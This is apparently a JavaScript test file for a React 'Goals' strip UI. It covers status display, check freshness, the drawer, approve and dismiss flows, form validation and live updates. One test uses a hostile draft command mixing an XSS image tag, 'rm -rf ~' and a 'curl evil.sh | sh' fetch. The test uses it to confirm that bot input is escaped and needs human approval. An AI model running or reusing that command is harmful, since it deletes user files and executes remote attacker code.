// Goals, 0.6.5 (smart-results-goals/plan.md §B): the Mission board's Goals strip. Empty, it is one line and
// "New goal", so the columns stay in view. Each goal is a two-line row (status, and the one thing worth
// knowing: a proposal, the open fix task, the failing check, or the schedule); the drawer has the checks,
// tokens spent, history and every button. Unknown is never drawn like Met. A bot's draft shows its checks
// verbatim in the drawer, next to Approve / Edit / Dismiss. With the setting off, or on a server without
// Goals, nothing shows.
import assert from 'node:assert/strict';
import test from 'node:test';
import { readFileSync } from 'node:fs';
import { JSDOM } from 'jsdom';
import { loadBundled } from './bundle.mjs';

const dom = new JSDOM('<!doctype html><html><body></body></html>', { url: 'http://localhost/s/s1', pretendToBeVisual: true });
const g = globalThis;
for (const k of ['window', 'document', 'navigator', 'HTMLElement', 'Node', 'Event', 'KeyboardEvent', 'MouseEvent', 'requestAnimationFrame', 'cancelAnimationFrame', 'getComputedStyle', 'localStorage', 'sessionStorage']) {
  if (!(k in dom.window)) continue;
  Object.defineProperty(g, k, { value: dom.window[k], configurable: true, writable: true });
}

const b = await loadBundled(`
  import React from 'react';
  import { renderToStaticMarkup } from 'react-dom/server.browser';
  import { GoalsStrip, GoalRow, GoalDetailBody } from './src/components/GoalsStrip';
  export { default as React } from 'react';
  export { createRoot } from 'react-dom/client';
  export { GoalsStrip, GoalRow, GoalDetailBody, GoalForm, GoalStatusPill, GoalTimeline } from './src/components/GoalsStrip';
  export * from './src/goals';
  export { emitMission } from './src/missions';
  export const stripHtml = (p) => renderToStaticMarkup(React.createElement(GoalsStrip, p));
  export const rowHtml = (p) => renderToStaticMarkup(React.createElement(GoalRow, { onOpen() {}, ...p }));
  export const detailHtml = (p) => renderToStaticMarkup(React.createElement(GoalDetailBody, { busy: false, error: null, onAction() {}, ...p }));
`);

const text = (html) => html.replace(/<[^>]+>/g, ' ').replace(/&#x27;|&#39;/g, "'").replace(/&quot;/g, '"').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&').replace(/\s+/g, ' ').trim();
const settle = async (ms = 0) => {
  if (ms) await new Promise((r) => setTimeout(r, ms));
  for (let i = 0; i < 10; i++) await new Promise((r) => setTimeout(r, 0));
};
const NOW = Date.parse('2026-11-02T12:00:00Z');
const minsAgo = (m) => new Date(NOW - m * 60_000).toISOString();
const minsAhead = (m) => new Date(NOW + m * 60_000).toISOString();
const names = { k_sandy: 'Sandy', k_cody: 'Cody' };

const check = (over = {}) => ({
  id: 'c1', label: 'Site answers', kind: 'http', spec: { url: 'https://kwant.si', expect_status: 200 }, required: true, freshness_minutes: null,
  latest: { status: 'passed', verdict: 'met', excerpt: 'HTTP 200', observed_at: minsAgo(10) }, ...over,
});
const goal = (over = {}) =>
  b.parseGoal({
    id: 'g1', space_id: 's1', title: 'The site stays up', description: 'kwant.si answers.', kwant_id: 'k_cody', status: 'met', mode: 'suggest',
    interval_minutes: 60, created_by: 'person', last_checked_at: minsAgo(10), next_check_at: minsAhead(50), created_at: minsAgo(600), updated_at: minsAgo(10),
    checks: [check()], ...over,
  });

// A server that remembers what was done to a goal, so the drawer's re-read agrees with the button's answer.
function fakeApi(list, over = {}) {
  const calls = [];
  let n = 0;
  const store = list.map((x) => ({ ...x }));
  const find = (id) => store.find((y) => y.id === id);
  const set = (id, patch) => Object.assign(find(id) ?? {}, patch);
  return {
    calls,
    list: async () => (calls.push(['list']), store.map((x) => ({ ...x }))),
    get: async (id) => {
      calls.push(['get', id]);
      const x = find(id) ?? goal({ id });
      return b.parseGoalDetail({
        goal: x, checks: x.checks, spent_tokens: 12_000,
        events: [
          { id: 'e1', kind: 'created', actor: 'person', detail: {}, created_at: minsAgo(600) },
          { id: 'e2', kind: 'checked', actor: 'kwant', detail: { verdict: 'not_met', passed: 0, total: 1 }, created_at: minsAgo(120) },
          { id: 'e3', kind: 'fix_opened', actor: 'kwant', detail: { task_id: 't_fix', task_title: 'Fix: The site stays up: Site answers failing' }, created_at: minsAgo(119) },
          { id: 'e4', kind: 'met', actor: 'kwant', detail: {}, created_at: minsAgo(10) },
        ],
        fix_tasks: [{ id: 't_fix', title: 'Fix: The site stays up: Site answers failing', state: 'verified', created_at: minsAgo(119) }],
      });
    },
    create: async (d, key) => (calls.push(['create', d, key]), goal({ id: `new${++n}`, title: d.title, status: 'checking', checks: [] })),
    update: async (id, patch) => (calls.push(['update', id, patch]), goal({ ...set(id, { status: patch.paused ? 'paused' : 'unknown' }) })),
    approve: async (id, key) => (calls.push(['approve', id, key]), goal({ ...set(id, { status: 'checking' }) })),
    check: async (id, key) => (calls.push(['check', id, key]), set(id, { status: 'checking', checking_since: minsAgo(0) }), null),
    remove: async (id) => (calls.push(['remove', id]), store.splice(store.indexOf(find(id)), 1), true),
    ...over,
  };
}

async function mount(Component, props) {
  const host = document.createElement('div');
  document.body.appendChild(host);
  const root = b.createRoot(host);
  root.render(b.React.createElement(Component, props));
  await settle();
  const q = (sel) => host.querySelector(sel);
  return {
    host,
    q,
    text: () => document.body.textContent.replace(/\s+/g, ' '),
    click: async (sel) => {
      const el = q(sel);
      assert.ok(el, `no ${sel}`);
      el.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
      await settle();
    },
    type: async (sel, value) => {
      const el = q(sel);
      assert.ok(el, `no ${sel}`);
      const proto = el.tagName === 'TEXTAREA' ? dom.window.HTMLTextAreaElement.prototype : el.tagName === 'SELECT' ? dom.window.HTMLSelectElement.prototype : dom.window.HTMLInputElement.prototype;
      Object.getOwnPropertyDescriptor(proto, 'value').set.call(el, value);
      el.dispatchEvent(new dom.window.Event(el.tagName === 'SELECT' ? 'change' : 'input', { bubbles: true }));
      await settle();
    },
    open: async (id) => {
      const el = q(`[data-goal="${id}"] [data-goal-open]`);
      assert.ok(el, `no row ${id}`);
      el.focus();
      el.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
      await settle();
      assert.ok(q(`[data-goal-detail="${id}"]`), `drawer for ${id}`);
    },
    done: () => {
      root.unmount();
      host.remove();
    },
  };
}

test('with Goals off, still loading, or on a server without Goals, the board shows nothing new', async () => {
  const api = fakeApi([goal()]);
  assert.equal(b.stripHtml({ names, now: NOW, initial: { setting: false, goals: [goal()] }, api }), '');
  // A server that doesn't say: the strip waits for the list, and shows nothing until it loads.
  assert.equal(b.stripHtml({ names, now: NOW, initial: { setting: null, goals: null }, api }), '');
  assert.notEqual(b.stripHtml({ names, now: NOW, initial: { setting: null, goals: [] }, api }), '');

  const old = fakeApi([], { list: async () => { throw new b.GoalError('This server doesn’t have Goals yet.', 404); } });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api: old, loadSetting: async () => null });
  assert.equal(m.host.innerHTML.length, 0, 'an older server: nothing at all');
  m.done();

  const off = fakeApi([goal()]);
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: off, loadSetting: async () => false });
  assert.equal(m2.host.innerHTML, '');
  assert.deepEqual(off.calls, [], 'off: Goals are not even read');
  m2.done();
});

test('the empty state is one line and New goal, with no list to push the columns down', () => {
  const html = b.stripHtml({ names, now: NOW, initial: { setting: true, goals: [] }, api: fakeApi([]) });
  const t = text(html);
  assert.match(t, /^Goals A goal says what should stay true\. It’s checked on a schedule, and a fix task opens if it breaks\. New goal$/);
  assert.match(html, /data-goals-empty/);
  assert.doesNotMatch(html, /data-goals-toggle/, 'nothing to show or hide');
  assert.doesNotMatch(html, /<ul/);
  assert.doesNotMatch(html, /[\u{1F300}-\u{1FAFF}]/u, 'no emoji in UI copy');
});

test('Unknown is never drawn like Met: its own word, colour, outline and icon', () => {
  const met = b.goalStatusLook('met');
  const unknown = b.goalStatusLook('unknown');
  assert.equal(met.label, 'Met');
  assert.equal(unknown.label, 'Unknown');
  assert.notEqual(unknown.tone, met.tone);
  assert.notEqual(unknown.icon, met.icon);
  // A status this build doesn't know reads as Unknown, never as Met.
  assert.deepEqual(b.goalStatusLook('something_new'), unknown);
  assert.equal(b.parseGoal({ id: 'x' }).status, 'unknown', 'no status from the server is Unknown');

  const html = b.stripHtml({ names, now: NOW, initial: { setting: true, goals: [goal({ id: 'a', status: 'met' }), goal({ id: 'b', status: 'unknown' })] }, api: fakeApi([]) });
  const pill = (status) => html.match(new RegExp(`<span[^>]*data-goal-status="${status}"[^>]*>.*?</span>`))[0];
  assert.match(pill('met'), /emerald/);
  assert.match(pill('unknown'), /border-dashed/);
  assert.doesNotMatch(pill('unknown'), /emerald/);
  assert.match(pill('unknown'), /lucide-circle-help|circle-question/);
  assert.doesNotMatch(pill('unknown'), /circle-check/);
  assert.match(text(pill('unknown')), /^Unknown$/);

  for (const s of ['draft', 'checking', 'met', 'not_met', 'fixing', 'unknown', 'needs_you', 'paused']) {
    const look = b.goalStatusLook(s);
    assert.ok(look.label && look.hint, s);
    if (s !== 'met') assert.notEqual(look.tone === 'emerald' && look.icon === 'met', true, `${s} must not look Met`);
  }
});

test('a check reads Passed, Failed, Couldn’t run, Out of date or Not checked yet; only Passed counts toward Met', () => {
  assert.deepEqual(b.checkLook(check(), 60, NOW), { label: 'Passed', tone: 'emerald', verdict: 'met' });
  assert.equal(b.checkLook(check({ latest: { status: 'failed', verdict: 'not_met', excerpt: '', observed_at: minsAgo(5) } }), 60, NOW).label, 'Failed');
  const err = b.checkLook(check({ latest: { status: 'error', verdict: 'unknown', excerpt: '', observed_at: minsAgo(5) } }), 60, NOW);
  assert.equal(err.label, 'Couldn’t run');
  assert.equal(err.verdict, 'unknown');
  // Stale: older than freshness (default twice the interval) is Unknown, even when it passed.
  const stale = b.checkLook(check({ latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(121) } }), 60, NOW);
  assert.deepEqual(stale, { label: 'Out of date', tone: 'zinc', verdict: 'unknown' });
  assert.equal(b.checkLook(check({ freshness_minutes: 5, latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(6) } }), 60, NOW).label, 'Out of date');
  assert.equal(b.checkLook(check({ latest: null }), 60, NOW).label, 'Not checked yet');

  const row = text(b.rowHtml({ goal: goal({ status: 'unknown', checks: [check({ latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(200) } })] }), names, now: NOW }));
  assert.match(row, /^The site stays up Unknown Site answers: Out of date · 3 h ago$/, row);

  // A goal stored as Met whose required check is out of date, missing or couldn't run shows as Unknown.
  const staleMet = goal({ status: 'met', checks: [check({ latest: { status: 'passed', verdict: 'met', excerpt: '', observed_at: minsAgo(200) } })] });
  assert.equal(b.shownStatus(staleMet, NOW), 'unknown');
  assert.equal(b.shownStatus(goal({ checks: [check({ latest: null })] }), NOW), 'unknown');
  assert.equal(b.shownStatus(goal({ checks: [check({ latest: { status: 'error', verdict: 'unknown', excerpt: '', observed_at: minsAgo(5) } })] }), NOW), 'unknown');
  assert.equal(b.shownStatus(goal({ checks: [check(), check({ id: 'c2', required: false, latest: null })] }), NOW), 'met', 'an optional check does not hold Met back');
  assert.equal(b.shownStatus(goal(), NOW), 'met');
  const strip = b.stripHtml({ names, now: NOW, initial: { setting: true, goals: [staleMet] }, api: fakeApi([]) });
  assert.match(strip, /data-goal-status="unknown"/);
  assert.doesNotMatch(strip, /data-goal-status="met"/);
  assert.doesNotMatch(text(strip), /1 met/);
});

test('a goal row is two short lines: status, then the fix task, the failing check, or the schedule', async () => {
  const fixTask = { id: 't_fix', title: 'Fix: The site stays up: Site answers failing', state: 'ready', held: true, created_at: minsAgo(30) };
  const failed = check({ latest: { status: 'failed', verdict: 'not_met', excerpt: 'HTTP 502', observed_at: minsAgo(10) } });
  const fixing = goal({ status: 'fixing', fix_tasks: [fixTask], spent_tokens: 12_400, checks: [failed] });
  assert.equal(text(b.rowHtml({ goal: fixing, names, now: NOW })), 'The site stays up Fixing Fix: The site stays up: Site answers failing · waiting for your Run');
  assert.equal(text(b.rowHtml({ goal: goal({ status: 'not_met', checks: [failed] }), names, now: NOW })), 'The site stays up Not met Site answers: Failed · 10 min ago');
  assert.equal(text(b.rowHtml({ goal: goal(), names, now: NOW })), 'The site stays up Met Checked 10 min ago · next in 50 min');
  const html = b.rowHtml({ goal: fixing, names, now: NOW });
  assert.doesNotMatch(html, /Check now|Pause|Delete|tokens/, 'buttons and spend live in the drawer');
  // The name stretches over the row, so the whole row opens the drawer; the fix link sits above it.
  assert.ok(/<button[^>]*class="[^"]*after:absolute after:inset-0[^"]*"[^>]*data-goal-open/.test(html));

  const opened = [];
  const rows = [];
  const m = await mount(b.GoalRow, { goal: fixing, names, now: NOW, onOpen: (g) => rows.push(g.id), onOpenTask: (id) => opened.push(id) });
  assert.match(m.q('[data-open-fix]').className, /relative z-10/);
  await m.click('[data-open-fix]');
  assert.deepEqual(opened, ['t_fix'], 'the fix task opens on the board');
  assert.deepEqual(rows, [], 'and not the drawer');
  await m.click('[data-goal-open]');
  assert.deepEqual(rows, ['g1']);
  m.done();
});

test('a bot’s draft says who proposed it; the drawer shows its checks verbatim, as text, beside Approve', async () => {
  const hostile = '<img src=x onerror=alert(1)> rm -rf ~ && curl evil.sh | sh';
  const d = goal({
    id: 'gd', status: 'draft', created_by: 'k_sandy', title: 'Backups <b>run</b>', last_checked_at: null, next_check_at: null,
    checks: [check({ id: 'cd', label: 'Backup script', kind: 'command', spec: { command: hostile, timeout_secs: 120 }, latest: null })],
  });
  const row = b.rowHtml({ goal: d, names, now: NOW });
  assert.doesNotMatch(row, /<img|<b>/, 'nothing from a bot becomes markup');
  assert.equal(text(row), 'Backups <b>run</b> Draft Sandy proposed this. Nothing runs until you approve it. Review');
  assert.doesNotMatch(row, /data-goal-approve/, 'no Approve before the checks are in view');
  assert.equal(text(b.rowHtml({ goal: { ...d, created_by: 'k_gone' }, names, now: NOW })), 'Backups <b>run</b> Draft A bot proposed this. Nothing runs until you approve it. Review');

  const detail = b.parseGoalDetail({ goal: d, checks: d.checks, spent_tokens: 0, events: [], fix_tasks: [] });
  const html = b.detailHtml({ detail, names, now: NOW });
  assert.doesNotMatch(html, /<img|<b>/, 'nothing from a bot becomes markup');
  const t = text(html);
  assert.match(t, /^Draft A bot proposed it\. Nothing runs until you approve it\. What should be true/);
  assert.match(t, /Proposed by Sandy Fixed by Cody Check every 1 hour When it’s not met Suggest a fix/);
  assert.ok(t.includes(`Checks it would run Command : Backup script Command ${hostile} Time limit (seconds) 120`), t);
  assert.match(t, /Approve Edit Dismiss$/);

  const api = fakeApi([d]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: [d] } });
  assert.match(m.q('[data-goal-counts]').textContent, /1 goal · 1 to approve/);
  await m.open('gd');
  await m.click('[data-goal-approve]');
  const approve = api.calls.find((c) => c[0] === 'approve');
  assert.equal(approve[1], 'gd');
  assert.ok(approve[2], 'approve sends an Idempotency-Key');
  await settle();
  assert.equal(m.q('[data-goal="gd"]').dataset.status, 'checking');
  assert.ok(!m.q('[data-goal-approve]'), 'the drawer reads it again: no longer a draft');
  assert.match(m.q('[data-goals-notice]').textContent, /Approved: “Backups <b>run<\/b>” is being checked now\./);
  m.done();

  // Dismiss asks first, then deletes the draft and closes the drawer; focus lands on New goal.
  const api2 = fakeApi([d]);
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: api2, initial: { setting: true, goals: [d] } });
  await m2.open('gd');
  await m2.click('[data-goal-dismiss]');
  assert.match(m2.q('[data-confirm-delete]').textContent, /Dismiss this proposal\? Nothing has run\./);
  assert.ok(document.activeElement === m2.q('[data-confirm-yes]'), 'focus moves to the confirm');
  await m2.click('[data-confirm-yes]');
  assert.deepEqual(api2.calls.at(-1), ['remove', 'gd']);
  assert.ok(!m2.q('[data-goal="gd"]'));
  assert.ok(!m2.q('[role="dialog"]'), 'the drawer closes');
  assert.ok(document.activeElement === m2.q('[data-new-goal]'), 'focus goes to New goal, not the page');
  m2.done();
});

test('Check now, Pause and Delete are in the drawer and call the server; a goal deleted elsewhere just leaves', async () => {
  const g1 = goal();
  const api = fakeApi([g1]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: [g1] } });
  assert.ok(!m.q('[data-goal-check-now]'), 'no buttons on the row');
  await m.open('g1');
  await m.click('[data-goal-check-now]');
  const chk = api.calls.find((c) => c[0] === 'check');
  assert.ok(chk && chk[2], 'check sends an Idempotency-Key');
  await settle();
  // No goal in the answer: it shows as checking until the live update arrives.
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'checking');
  assert.equal(m.q('[data-goal-check-now]').disabled, true, 'no second check while one runs');
  m.done();

  const api2 = fakeApi([g1]);
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api: api2, initial: { setting: true, goals: [g1] } });
  await m2.open('g1');
  await m2.click('[data-goal-pause="pause"]');
  await settle();
  assert.deepEqual(api2.calls.find((c) => c[0] === 'update'), ['update', 'g1', { paused: true }]);
  assert.equal(m2.q('[data-goal="g1"]').dataset.status, 'paused');
  assert.match(m2.q('[data-goal="g1"] [data-goal-schedule]').textContent, /Paused, no checks until you resume/);
  assert.ok(m2.q('[data-goal-pause="resume"]'));
  // A paused goal can still be checked by hand (Rigel Q10).
  assert.equal(m2.q('[data-goal-check-now]').disabled, false);
  m2.done();

  const gone = fakeApi([g1, goal({ id: 'g2', title: 'Second' })], { remove: async () => { throw new b.GoalError('Not found', 404); } });
  const m3 = await mount(b.GoalsStrip, { names, now: NOW, api: gone, initial: { setting: true, goals: [g1, goal({ id: 'g2', title: 'Second' })] } });
  await m3.open('g1');
  await m3.click('[data-goal-delete]');
  assert.match(m3.q('[data-confirm-delete]').textContent, /Delete this goal\? Its checks and history go too\. Open fix tasks stay on the board\./);
  await m3.click('[data-confirm-yes]');
  assert.ok(!m3.q('[data-goal="g1"]'));
  assert.ok(m3.q('[data-goal="g2"]'));
  assert.ok(!m3.q('[role="dialog"]'), 'the drawer closes');
  assert.match(m3.q('[data-goals-notice]').textContent, /already deleted/);
  m3.done();

  const denied = fakeApi([g1], { check: async () => { throw new b.GoalError('Only you can change goals.', 403); } });
  const m4 = await mount(b.GoalsStrip, { names, now: NOW, api: denied, initial: { setting: true, goals: [g1] } });
  await m4.open('g1');
  await m4.click('[data-goal-check-now]');
  assert.equal(m4.q('[data-goal-detail-error]').textContent, 'Only you can change goals.');
  assert.equal(m4.q('[data-goal-detail-error]').getAttribute('role'), 'alert');
  // The row keeps it in view after the drawer closes, without announcing it a second time.
  assert.equal(m4.q('[data-goal="g1"] [data-goal-error]').textContent, 'Only you can change goals.');
  assert.equal(m4.q('[data-goal="g1"] [data-goal-error]').getAttribute('role'), null);
  m4.done();
});

test('New goal validates in plain words, focuses the first problem, and creates once', async () => {
  const empty = b.goalFormErrors(b.formFromGoal(null));
  assert.equal(empty.title, 'Give the goal a short name.');
  assert.equal(empty.kwantId, 'Pick the bot that fixes it, or choose Just tell me.');
  assert.equal(Object.values(empty.rows)[0], 'Type the command to run.');
  const watch = b.goalFormErrors({ ...b.formFromGoal(null), mode: 'watch' });
  assert.equal(watch.kwantId, undefined, 'Just tell me needs no bot');
  const http = { ...b.emptyCheckRow('http'), url: 'kwant.si' };
  assert.equal(b.checkRowError(http), 'The address should start with http:// or https://.');
  assert.equal(b.checkRowError({ ...http, url: 'https://kwant.si', expectStatus: '99' }), 'The answer code is a number from 100 to 599, like 200.');
  assert.equal(b.checkRowError({ ...b.emptyCheckRow('file_sha256'), path: 'a', sha256: 'xyz' }), 'A fingerprint is 64 letters and digits (0–9 and a–f).');
  const none = b.goalFormErrors({ ...b.formFromGoal(null), title: 'x', kwantId: 'k', checks: [{ ...b.emptyCheckRow(), command: 'true', required: false }] });
  assert.equal(none.checks, 'Keep at least one check required: Met needs one.');

  const api = fakeApi([]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: [] } });
  await m.click('[data-new-goal]');
  assert.ok(m.q('[role="dialog"]'), 'the form opens in a panel');
  assert.match(m.q('[role="dialog"] h3').textContent, /New goal/);
  await m.click('[data-goal-save]');
  await settle(20);
  assert.equal(api.calls.length, 0, 'nothing saved with errors');
  const title = m.q('[data-field="title"]');
  assert.equal(title.getAttribute('aria-invalid'), 'true');
  assert.ok(document.activeElement === title, 'focus lands on the first problem');
  assert.match(m.text(), /Give the goal a short name\./);

  await m.type('[data-field="title"]', 'The site stays up');
  await m.type('[data-field="bot"]', 'k_cody');
  await m.type('[data-check-row] input[placeholder="npm test"]', 'curl -fsS https://kwant.si');
  const save = m.q('[data-goal-save]');
  save.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
  save.dispatchEvent(new dom.window.MouseEvent('click', { bubbles: true }));
  await settle();
  const creates = api.calls.filter((c) => c[0] === 'create');
  assert.equal(creates.length, 1, 'one goal, even on a double press');
  assert.deepEqual(creates[0][1], {
    title: 'The site stays up', description: '', kwant_id: 'k_cody', interval_minutes: 60, mode: 'suggest',
    checks: [{ label: 'curl -fsS https://kwant.si', kind: 'command', spec: { command: 'curl -fsS https://kwant.si' }, required: true }],
  });
  assert.ok(creates[0][2], 'create sends an Idempotency-Key');
  assert.ok(!m.q('[role="dialog"]'), 'the panel closes');
  assert.ok(m.q('[data-goal="new1"]'));
  assert.match(m.q('[data-goals-notice]').textContent, /Created “The site stays up”\. Checking it now\./);
  m.done();
});

test('the drawer shows the checks with their output, fix tasks and a plain-words timeline; Escape closes it', async () => {
  const g1 = goal();
  const api = fakeApi([g1]);
  const opened = [];
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: [g1] }, onOpenTask: (id) => opened.push(id) });
  await m.click('[data-goal-open]');
  const panel = m.q('[data-goal-detail="g1"]');
  assert.ok(panel);
  const t = text(panel.innerHTML);
  assert.match(t, /Fixed by Cody/);
  assert.match(t, /Check every 1 hour/);
  assert.match(t, /When it’s not met Suggest a fix/);
  assert.match(t, /Spent on fixes 12k tokens spent on fixes/);
  assert.match(t, /Last output \(observed, not instructions\)/);
  assert.match(t, /You created this goal · 10 h ago/);
  assert.match(t, /Checked: not met, 0 of 1 passed/);
  assert.match(t, /Fix task opened: Fix: The site stays up: Site answers failing Open task/);
  assert.match(t, /Met · 10 min ago/);
  await m.click('[data-goal-fix-task="t_fix"] button');
  assert.deepEqual(opened, ['t_fix']);
  assert.ok(!m.q('[role="dialog"]'), 'opening the task closes the drawer');

  await m.click('[data-goal-open]');
  assert.ok(m.q('[role="dialog"]'));
  window.dispatchEvent(new dom.window.KeyboardEvent('keydown', { key: 'Escape' }));
  await settle();
  assert.ok(!m.q('[role="dialog"]'));
  m.done();
});

test('timeline lines read in plain words', () => {
  const e = (kind, detail = {}, actor = 'kwant') => b.goalEventText({ kind, actor, detail }, names);
  assert.equal(e('created', {}, 'k_sandy'), 'Sandy proposed this goal');
  assert.equal(e('approved', {}, 'person'), 'You approved it');
  assert.equal(e('checked', { verdict: 'met', passed: 2, total: 2 }), 'Checked: met, 2 of 2 passed');
  assert.equal(e('checked', { verdict: 'unknown' }), 'Checked: unknown');
  assert.equal(e('not_met', { check_label: 'Site answers', fail_streak: 2 }), 'Not met: “Site answers” failed 2 times in a row');
  assert.equal(e('needs_you', { reason: 'budget' }), 'Needs you: its token budget is spent');
  assert.equal(e('needs_you', { reason: 'max_fixes_per_day' }), 'Needs you: it hit its fixes for today');
  assert.equal(e('paused', {}, 'person'), 'You paused it');
  assert.equal(e('fix_verified'), 'Fix verified');
});

test('the storage layer’s shapes read the same: epoch times, severity, JSON text, task_id links, no bot', () => {
  const sec = Math.floor(NOW / 1000) - 600;
  const d = b.parseGoalDetail({
    goal: {
      id: 'g9', title: 'Raw row', status: 'met', mode: 'watch', interval_minutes: 60, kwant_id: '',
      created_at: sec - 3600, updated_at: (sec - 60) * 1000, last_checked_at: sec, next_check_at: sec + 3600, checking_since: 0,
    },
    checks: [
      { id: 'c1', label: 'Site answers', kind: 'http', severity: 'required', spec: '{"url":"https://kwant.si","expect_status":200}', freshness_minutes: 120,
        latest: { status: 'passed', verdict: 'met', excerpt: 'HTTP 200', observed_at: sec, expires_at: sec + 7200 } },
      { id: 'c2', label: 'Nice to have', kind: 'shell', severity: 'advisory', spec: 'not json' },
      { id: 'c3', label: 'Override', kind: 'shell', severity: 'advisory', required: true, spec: {} },
    ],
    events: [
      { id: 'e2', kind: 'approved', actor: 'you', detail: '{}', created_at: sec - 1800 },
      { id: 'e1', kind: 'created', actor: 'k_sandy', detail: '{"mode":"watch"}', created_at: sec - 3600 },
    ],
    fix_tasks: [{ task_id: 't1', created_at: sec, state: 'working', spent_tokens: 1200 }],
    spent_tokens: 1200,
  });
  const g = d.goal;
  assert.equal(g.kwant_id, null, 'an empty bot id is no bot');
  assert.equal(g.created_at, new Date((sec - 3600) * 1000).toISOString(), 'epoch seconds become ISO');
  assert.equal(g.updated_at, new Date((sec - 60) * 1000).toISOString(), 'epoch milliseconds become ISO');
  assert.equal(g.last_checked_at, new Date(sec * 1000).toISOString());
  assert.equal(g.checking_since, null, 'zero is not a time');
  const [c1, c2, c3] = d.checks;
  assert.equal(c1.required, true);
  assert.equal(c1.spec.url, 'https://kwant.si', 'spec stored as JSON text is read');
  assert.equal(c1.latest.observed_at, new Date(sec * 1000).toISOString());
  assert.equal(c2.required, false, 'advisory severity is informational');
  assert.deepEqual(c2.spec, {}, 'unreadable spec is empty, not a crash');
  assert.equal(c3.required, true, 'an explicit required wins');
  assert.deepEqual(d.events.map((e) => e.id), ['e1', 'e2'], 'events sort by time, not by text');
  assert.equal(d.events[0].detail.mode, 'watch', 'detail stored as JSON text is read');
  assert.equal(d.fix_tasks[0].id, 't1');
  assert.equal(d.fix_tasks[0].title, 'Fix task', 'a link without a title still reads');
  assert.equal(g.open_fix_task?.id, 't1');
  assert.equal(b.shownStatus({ ...g, checks: [c1, c2] }, NOW), 'met', 'a fresh Met from epoch times stays Met; an advisory check doesn’t hold it back');
  assert.equal(b.shownStatus(g, NOW), 'unknown', 'a required check never run keeps it Unknown');
  const expired = { ...c1, latest: { ...c1.latest, expires_at: new Date(NOW - 1000).toISOString() } };
  assert.equal(b.checkLook(expired, 60, NOW).label, 'Out of date', 'past the server’s expiry, a pass is out of date');
  assert.equal(b.shownStatus({ ...g, checks: [expired] }, NOW), 'unknown');
});

test('live: goal changes reload the strip once per burst; Settings switches it on and off at once', async () => {
  let list = [goal()];
  const api = fakeApi([], { list: async () => (api.calls.push(['list']), list.map((x) => ({ ...x }))) });
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, loadSetting: async () => true });
  assert.equal(api.calls.filter((c) => c[0] === 'list').length, 1);
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'met');

  list = [goal({ status: 'not_met' })];
  b.emitMission({ type: 'goal_updated', data: { id: 'g1', status: 'checking' } });
  b.emitMission({ type: 'goal_updated', data: { id: 'g1', status: 'not_met' } });
  await settle(300);
  assert.equal(api.calls.filter((c) => c[0] === 'list').length, 2, 'two events, one read');
  assert.equal(m.q('[data-goal="g1"]').dataset.status, 'not_met');

  window.dispatchEvent(new dom.window.CustomEvent(b.GOALS_SETTING_EVENT, { detail: false }));
  await settle();
  assert.equal(m.host.innerHTML, '', 'switched off in Settings: gone at once');
  window.dispatchEvent(new dom.window.CustomEvent(b.GOALS_SETTING_EVENT, { detail: true }));
  await settle();
  assert.ok(m.q('[data-goals-strip]'));
  m.done();
});

test('many goals with long titles: needs-you first, six shown (three on a phone), the rest one press away', async () => {
  const long = 'A very long goal title that keeps going and going without a single break '.repeat(3);
  const many = Array.from({ length: 30 }, (_, i) => goal({ id: `g${i}`, title: `${long}${i}`, status: i === 17 ? 'needs_you' : i === 5 ? 'not_met' : 'met' }));
  const api = fakeApi([]);
  const m = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: many } });
  const cards = () => [...m.host.querySelectorAll('[data-goal]')];
  assert.equal(cards().length, 6);
  assert.deepEqual(cards().slice(0, 2).map((c) => c.dataset.status), ['needs_you', 'not_met']);
  assert.match(m.q('[data-goal-counts]').textContent, /30 goals · 28 met · 2 need you/);
  // One line each: the name is cut short, and the full name is a hover away and in the drawer.
  for (const c of cards()) {
    const t = c.querySelector('[data-goal-open]');
    assert.match(t.className, /\btruncate\b/);
    assert.ok(t.getAttribute('title') === t.textContent);
  }
  // A phone shows three rows; "Show all" brings the rest.
  assert.deepEqual(cards().map((c) => /max-sm:hidden/.test(c.className)), [false, false, false, true, true, true]);
  assert.equal(m.q('[data-goals-all]').textContent, 'Show all 30 goals');
  assert.doesNotMatch(m.q('[data-goals-all]').className, /sm:hidden/);
  await m.click('[data-goals-all]');
  assert.equal(cards().length, 30);
  assert.ok(cards().every((c) => !/max-sm:hidden/.test(c.className)));
  assert.equal(m.q('[data-goals-all]').textContent, 'Show fewer');
  m.done();

  // Five goals: all of them fit a wide screen, so "Show all" is for a phone only.
  const five = many.slice(0, 5);
  const m3 = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: five } });
  assert.equal(cards.call(null).length, 0);
  assert.equal(m3.host.querySelectorAll('[data-goal]').length, 5);
  assert.match(m3.q('[data-goals-all]').className, /(^|\s)sm:hidden/);
  assert.equal(m3.q('[data-goals-all]').textContent, 'Show all 5 goals');
  m3.done();
  // Three or fewer: no button at all.
  const m4 = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: many.slice(0, 3) } });
  assert.ok(!m4.q('[data-goals-all]'));
  m4.done();

  // Collapsed: one row, nothing below it.
  localStorage.setItem('kwnt.goals.open', '0');
  const m2 = await mount(b.GoalsStrip, { names, now: NOW, api, initial: { setting: true, goals: many } });
  assert.equal(cards.call(null).length, 0);
  assert.equal(m2.host.querySelectorAll('[data-goal]').length, 0);
  assert.equal(m2.q('[data-goals-toggle]').getAttribute('aria-expanded'), 'false');
  await m2.click('[data-goals-toggle]');
